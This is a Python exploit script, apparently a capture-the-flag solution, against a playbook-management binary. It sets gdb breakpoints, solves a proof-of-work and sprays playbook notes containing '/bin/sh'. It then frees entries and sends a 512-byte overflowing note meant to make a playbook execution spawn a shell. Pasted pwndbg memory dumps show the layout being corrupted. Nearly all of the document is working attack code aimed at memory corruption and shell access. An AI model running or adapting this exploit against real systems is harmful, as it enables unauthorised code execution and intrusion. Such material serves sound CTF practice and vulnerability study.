#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from subprocess import check_output
from time import sleep

context.update(
    log_level='debug',
    arch='amd64', # Maybe change this
    os='linux',   # Maybe change this
    binary=ELF('./chal', checksec=False),
    terminal=[
        "wt.exe", "-w", "0", "split-pane", "--size", "0.65", "-d", ".",
        "wsl.exe", "-d", "Ubuntu-22.04", "--", "bash", "-c"
    ]
)
exe = context.binary
libc = exe.libc

gdbscript = '''
init-pwndbg
# init-gef-bata
set follow-fork-mode parent

b new_playbook
b *0x4021C5
b *0x401FD3
b *0x401F41

b *0x402462
b *0x402462

b execute
b *0x4025A4
b *0x4025B0

b *0x401F39
b *0x401FCB
c
'''

def start(argv=[]):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2])
    elif args.DOCKER:
        p = remote("localhost", 5000)
        context.update(terminal=['tmux', 'new-window', '-n', 'GDB-Debug', '-P', '-d']) # Need to use tmux
        sleep(0.5)
        pid = int(check_output(["pidof", "-s", "/app/run"]))
        gdb.attach(int(pid), gdbscript=gdbscript+f"\n set sysroot /proc/{pid}/root\nfile /proc/{pid}/exe", exe=exe.path)
        pause()
        return p
    elif args.QEMU:
        if args.GDB:
            # Open port 5000 for target remote in GDB
            return process(["qemu-aarch64", "-g", "5000", "-L", "/usr/aarch64-linux-gnu", exe.path] + argv)
        else:
            return process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu", exe.path] + argv)
    else:
        return process([exe.path] + argv, aslr=False)


def one_gadget(filename, base_addr=0):
  return [(int(i)+base_addr) for i in check_output(['one_gadget', '--raw', '-l0', filename]).decode().split(' ')]


def debug():
    gdb.attach(p, gdbscript=gdbscript)
    pause()


def add(list_data: list[bytes]):
    p.sendline(b"2")
    p.recvuntil(
        b'Enter new playbook in the SOPS language. Empty line finishes the entry.\n')
    for data in list_data:
        # if len(data) == 251 or b'\n' in data:
        #     p.send(data)
        # else:
        p.sendline(data)


def remove(idx):
    p.sendlineafter(b"5. Quit\n", b"3")
    p.sendlineafter(b"Enter playbook id:\n", str(idx).encode())


def execute(idx):
    p.sendlineafter(b"5. Quit\n", b"4")
    p.sendlineafter(b"Enter playbook id:\n", str(idx).encode())

# ==================== EXPLOIT ====================
p = start()

# nesting_depth -> 0x552b40
# steps -> 0x4c7b40
# *p_idx -> [rbp-20h]

# for i in range(1, 0x11):
#     add([
#         b"note: " + bytes(str(i), 'utf-8') * 0x30,
#         b'STEP',
#         b"note: " + bytes(str(i + 1), 'utf-8') * 0x30,
#         b'ENDSTEP',
#         b'\n'
#         ])
#     remove(i + 1)

# Solve pow
if args.REMOTE:
    ru(b'You can run the solver with:\n    ')
    cmd = rl().decode().strip()
    out = check_output(
        f'exec {cmd}', shell=True, executable='/bin/bash', text=True
    ).strip()
    sla(b'Solution? ', out.encode())


for i in range(1, 600):
    info(f'Loops number {i}')
    if i < 3:
        add([b"note: " + b'A' * 0x30, b'STEP', b'\n'])
    else:
        add([b"note: " + b'/bin/sh', b'\n'])


# debug()
remove(591)
remove(592)

'''
pwndbg> tel 0x4c7b40+328596
00:0000│  0x517ed4 (steps+328596) ◂— 5
01:0008│  0x517edc (steps+328604) ◂— 0
02:0010│  0x517ee4 (steps+328612) ◂— 0
03:0018│  0x517eec (steps+328620) ◂— 0
04:0020│  0x517ef4 (steps+328628) ◂— 0
05:0028│  0x517efc (steps+328636) ◂— 0x687300000000
06:0030│  0x517f04 (steps+328644) ◂— 0
07:0038│  0x517f0c (steps+328652) ◂— 0
pwndbg> tel 0x517ed4+0x2c
00:0000│  0x517f00 (steps+328640) ◂— 0x6873 /* 'sh' */
01:0008│  0x517f08 (steps+328648) ◂— 0
02:0010│  0x517f10 (steps+328656) ◂— 0
03:0018│  0x517f18 (steps+328664) ◂— 0
04:0020│  0x517f20 (steps+328672) ◂— 0
05:0028│  0x517f28 (steps+328680) ◂— 0
06:0030│  0x517f30 (steps+328688) ◂— 0
07:0038│  0x517f38 (steps+328696) ◂— 0

pwndbg> tel 0x517f00+512
00:0000│  0x518100 (steps+329152) ◂— 5
01:0008│  0x518108 (steps+329160) ◂— 0
02:0010│  0x518110 (steps+329168) ◂— 0
03:0018│  0x518118 (steps+329176) ◂— 0
04:0020│  0x518120 (steps+329184) ◂— 0
05:0028│  0x518128 (steps+329192) ◂— 0x687300000000
06:0030│  0x518130 (steps+329200) ◂— 0
07:0038│  0x518138 (steps+329208) ◂— 0
pwndbg> tel 0x517f00+512+0x2c
00:0000│  0x51812c (steps+329196) ◂— 0x6873 /* 'sh' */
01:0008│  0x518134 (steps+329204) ◂— 0
02:0010│  0x51813c (steps+329212) ◂— 0
03:0018│  0x518144 (steps+329220) ◂— 0
04:0020│  0x51814c (steps+329228) ◂— 0
05:0028│  0x518154 (steps+329236) ◂— 0
06:0030│  0x51815c (steps+329244) ◂— 0
07:0038│  0x518164 (steps+329252) ◂— 0
'''

add([b'ENDSTEP', b'ENDSTEP', b'STEP', b'note: '+b'1'*(512)+p8(1 | 2), b'\n'])

execute(593)
sl(b'A')

interactive(flag=False)
